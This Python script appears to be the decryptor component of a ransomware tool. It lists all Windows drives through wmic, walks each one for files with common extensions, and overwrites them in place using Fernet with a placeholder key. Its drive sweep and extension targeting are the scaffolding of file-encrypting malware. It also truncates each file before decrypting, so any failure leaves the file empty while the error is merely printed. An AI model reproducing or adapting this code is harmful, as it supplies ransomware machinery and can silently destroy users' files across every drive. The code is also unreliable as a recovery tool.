from cryptography.fernet import Fernet
from subprocess import check_output
import os

drives = ["A:", "B:", "C:", "D:", "F:", "G:", "H:", "Z:", "N:", "K:", "L:", "X:", "P:", "U:", "J:", "S:", "R:",
          "W:", "Q:", "T:", "Y:", "I:", "O:", "V:", "M:", "E:"]
formats = [".jpg", ".pdf", ".mp3", ".rar", ".mp4", ".txt", ".html", ".js", ".php", ".png"]


""" def Decrypt_with_paths():
    decrypter = Fernet(b'key')
    path_file = open("paths.txt", 'r')
    for line in path_file:
        files = open(line, 'r+b')
        files_data = files.read()
        files.seek(0)
        files.truncate()
        new_data = decrypter.decrypt(files_data)
        files.write(new_data)
        files.close()
    path_file.close() """


def Decrypt():
    valid_drive = []
    CMD_output = check_output("wmic logicaldisk get name", shell=True)
    for drive in drives:
        if drive in CMD_output.decode("UTF-8"):
            valid_drive.append(drive)

    Decrypter = Fernet(b'key')
    for drive in valid_drive:
        for r, d, f in os.walk(drive + "\\"):
            for file in f:
                for one_format in formats:
                    if file.endswith(one_format):
                        try:
                            files = open(os.path.join(r, file), "r+b")
                            encrypt_data = files.read()
                            files.seek(0)
                            files.truncate()
                            decrypt_data = Decrypter.decrypt(encrypt_data)
                            files.write(decrypt_data)
                            files.close()

                        except Exception as error:
                            print(error)
                            continue


if __name__ == "__main__":
    Decrypt()
